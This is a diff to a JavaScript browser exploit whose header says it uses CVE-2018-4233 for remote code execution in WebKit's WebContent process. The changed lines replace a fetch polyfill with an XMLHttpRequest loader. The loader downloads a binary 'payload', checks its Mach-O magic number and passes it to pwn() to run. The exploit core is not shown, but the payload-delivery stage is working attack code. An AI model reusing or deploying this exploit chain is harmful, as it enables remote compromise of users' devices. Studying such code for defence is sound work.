@@ -4,33 +4,6 @@
  * This exploit uses CVE-2018-4233 (by saelo) to get RCE in WebContent.
  */
 
-// ghetto polyfill
-if(!window.fetch)
-{
-    window.fetch = function(url)
-    {
-        return new Promise((resolve, reject) =>
-        {
-            var req = new XMLHttpRequest();
-            req.open("GET", url);
-            req.responseType = 'blob';
-            req.addEventListener('load', function()
-            {
-                if(req.responseType != 'blob')
-                {
-                    throw 'y u no blob';
-                }
-                resolve(new Response(req.response));
-            });
-            req.addEventListener('error', function(ev)
-            {
-                reject(ev);
-            });
-            req.send();
-        });
-    };
-}
-
 ITERS = 10000
 ALLOCS = 1000
 
@@ -432,11 +405,22 @@ function get_mem_new(stage1) {
     return stage2
 }
 
-function go() {
-    fetch('payload').then((response) => {
-        response.arrayBuffer().then((buffer) => {
-            try {
-                var arrayBuf = new Uint8Array(buffer);
+function go()
+{
+    try
+    {
+        var req = new XMLHttpRequest();
+        req.open('GET', 'payload');
+        req.responseType = 'arraybuffer';
+        req.addEventListener('load', function()
+        {
+            try
+            {
+                if(req.responseType != 'arraybuffer')
+                {
+                    throw 'y u no blob';
+                }
+                var arrayBuf = new Uint8Array(req.response);
                 var header = b2u32(arrayBuf.slice(0, 4)); // sanity check on the header
                 if(header != 0xfeedfacf)
                 {
@@ -444,9 +428,20 @@ function go() {
                     return;
                 }
                 pwn(arrayBuf);
-            } catch (e) {
+            }
+            catch(e)
+            {
                 fail(`Error: ${e}\n${e.stack}`);
             }
-        })
-    });
+        });
+        req.addEventListener('error', function(ev)
+        {
+            fail(ev);
+        });
+        req.send();
+    }
+    catch(e)
+    {
+        fail(`Error: ${e}\n${e.stack}`);
+    }
 }
